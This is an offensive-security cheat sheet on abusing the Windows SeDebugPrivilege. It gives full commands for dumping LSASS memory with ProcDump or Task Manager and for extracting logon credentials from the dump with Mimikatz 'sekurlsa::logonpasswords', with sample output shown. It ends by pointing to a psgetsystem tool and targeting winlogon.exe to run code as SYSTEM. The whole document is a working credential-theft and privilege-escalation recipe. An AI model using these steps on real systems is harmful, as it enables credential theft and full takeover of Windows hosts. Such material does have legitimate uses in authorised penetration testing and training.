# SeDebugPrivilege - Dump hashes

Use To run a particular application or service or assist with troubleshooting with administrator privilege without Administrator user

> **Admins take this privilege by default**

### Severity:

* used to capture sensitive information from system memory
* access/modify kernel and application structures

***

## Exploit SeDebugPrivilege

### Debug programs right

```powershell
C:\irix> **whoami /priv**

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
**SeDebugPrivilege**                          Debug programs                                                     Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set   
```

> **default this privilege is disabled but `ProcDump` can use it if disabled**

### Dump memory - **`ProcDump`**

dump hashes from LSASS

```powershell
C:\irix> **procdump.exe -accepteula -ma lsass.exe lsass.dmp**

ProcDump v10.0 - Sysinternals process dump utility
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[15:25:45] Dump 1 initiated: C:\Tools\Procdump\lsass.dmp
[15:25:45] Dump 1 writing: Estimated dump file size is 42 MB.
[15:25:45] Dump 1 complete: 43 MB written in 0.5 seconds
[15:25:46] Dump count reached.
```

### Access Hashed - **`Mimikatz`**

```powershell
mimikatz # **log**
Using 'mimikatz.log' for logfile : OK

mimikatz # **sekurlsa::minidump lsass.dmp**
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # **sekurlsa::logonpasswords**
Opening : 'lsass.dmp' file for minidump...

Authentication Id : 0 ; 23196355 (00000000:0161f2c3)
Session           : Interactive from 4
User Name         : DWM-4
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/31/2021 3:00:57 PM
SID               : S-1-5-90-0-4
        msv :
        tspkg :
        wdigest :
         * Username : WINLPE-SRV01$
         * Domain   : WORKGROUP
```

***

### Dump Memory - Manual

**open task manger → Details → lsass process → create dump file**

![image.png](../../../../.gitbook/assets/image.png)

***

## **Remote Code Execution as SYSTEM**

[https://github.com/decoder-it/psgetsystem.git](https://github.com/decoder-it/psgetsystem.git)

First, open an elevated PowerShell console (right-click, run as admin, and type in the credentials for the `jordan` user). Next, type `tasklist` to get a listing of running processes and accompanying PIDs.

```powershell
PS C:\irix> **tasklist** 

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          4 K
System                           4 Services                   0        116 K
smss.exe                       340 Services                   0      1,212 K
csrss.exe                      444 Services                   0      4,696 K
wininit.exe                    548 Services                   0      5,240 K
csrss.exe                      556 Console                    1      5,972 K
winlogon.exe                   612 Console                    1     10,408 K
```

Here we can target `winlogon.exe` running under PID 612, which we know runs as SYSTEM on Windows hosts.

<figure><img src="../../../../.gitbook/assets/image 1.png" alt=""><figcaption></figcaption></figure>
